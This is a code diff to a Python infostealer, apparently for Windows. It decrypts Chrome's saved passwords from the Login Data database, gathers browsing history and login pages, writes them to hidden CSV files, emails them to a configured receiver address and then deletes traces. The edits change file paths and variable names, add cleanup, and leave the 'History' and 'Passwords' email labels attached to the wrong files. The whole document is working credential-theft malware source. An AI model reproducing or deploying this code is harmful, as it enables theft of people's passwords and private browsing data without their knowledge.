@@ -19,7 +19,7 @@ from json import loads
 
 # The mail addresses and password
 SENDER = ""  # Syntax: <Example.email1@gmail.com>
-SENDER_P = ""  # App password here, 16-character code, all lowercase and no space, Syntax: "<totallyyrealpass>"
+SENDER_P = ""  # Put your app password here
 RECEIVER = ""  # Syntax: <Example.email2@gmail.com>
 
 
@@ -116,12 +116,12 @@ def decrypt_chrome_passwords():
 
     try:
         # Create Dataframe to store passwords
-        with open(f"C:\\Users\\{os.getlogin()}\\Documents\\.tempcache.csv", mode='w', newline='',
+        with open(f"C:\\Users\\temp\\.tempcache.csv", mode='w', newline='',
                   encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index", "url", "username", "password"])
             # (1) Get secret key
-            secret_key = get_secret_key()
+            secr_key = get_secret_key()
             # Search user profile or default folder (this is where the encrypted login password is stored)
             folders = [element for element in os.listdir(CHROME_PATH) if
                        search("^Profile*|^Default$", element) != None]
@@ -129,17 +129,17 @@ def decrypt_chrome_passwords():
                 # (2) Get ciphertext from sqlite database
                 chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                 conn = get_db_connection(chrome_path_login_db)
-                if secret_key and conn:
+                if secr_key and conn:
                     cursor = conn.cursor()
                     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                     for index, login in enumerate(cursor.fetchall()):
                         url = login[0]
                         username = login[1]
-                        ciphertext = login[2]
-                        if url != "" and username != "" and ciphertext != "":
+                        cipher_text = login[2]
+                        if url != "" and username != "" and cipher_text != "":
                             # (3) Filter the initialisation vector & encrypted password from ciphertext
                             # (4) Use AES algorithm to decrypt the password
-                            decrypted_password = decrypt_password(ciphertext, secret_key)
+                            decrypted_password = decrypt_password(cipher_text, secr_key)
                             # (5) Save into CSV
                             csv_writer.writerow([index, url, username, decrypted_password])
                     # Close database connection
@@ -158,10 +158,10 @@ def download_form(url, i):
         opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
         login_html = opener.open(url).read()
         # make a html file and store login_html in it
-        with open(f"C:\\Users\\{os.getlogin()}\\Documents\\login{i}.html", "wb") as f:
+        with open(f"C:\\temp\\login{i}.html", "wb") as f:
             f.write(login_html)
         # put it on form_list
-        form_list.append(f"C:\\Users\\{os.getlogin()}\\Documents\\login{i}.html")
+        form_list.append(f"C:\\temp\\login{i}.html")
     except Exception:  # NOQA
         pass
 
@@ -192,7 +192,7 @@ def get_chrome_history():
 
                 i += 1
             # write to csv file but don't delete the previous data
-            with open(f"C:\\Users\\{os.getlogin()}\\Documents\\.tempcache2.csv", mode='a', newline='',
+            with open(f"C:\\temp\\.tempcache2.csv", mode='a', newline='',
                       encoding='utf-8') as decrypt_password_file:
                 decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"',
                                                      quoting=csv.QUOTE_MINIMAL)
@@ -203,9 +203,14 @@ def get_chrome_history():
 
     try:
         os.remove(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History.txt")
+        f.close()
     except Exception:  # NOQA
         pass
-    f.close()
+
+
+def delete_form(form_lst):
+    for i in form_lst:
+        os.remove(i)
 
 
 def send_priority(subject, filename):
@@ -285,7 +290,11 @@ try:
 except Exception:  # NOQA
     pass
 try:
-    send_priority("Chrome History", f"C:\\Users\\{os.getlogin()}\\Documents\\.tempcache2.csv")
+    delete_form(form_list)
+except Exception:  # NOQA
+    pass
+try:
+    send_priority("Chrome History", f"C:\\temp\\.tempcache.csv")
 except Exception:  # NOQA
     pass
 
@@ -294,7 +303,7 @@ try:
 except Exception:  # NOQA
     pass
 try:
-    send_priority("Chrome Passwords", f"C:\\Users\\{os.getlogin()}\\Documents\\.tempcache.csv")
+    send_priority("Chrome Passwords", f"C:\\temp\\.tempcache2.csv")
 except Exception:  # NOQA
     pass
 
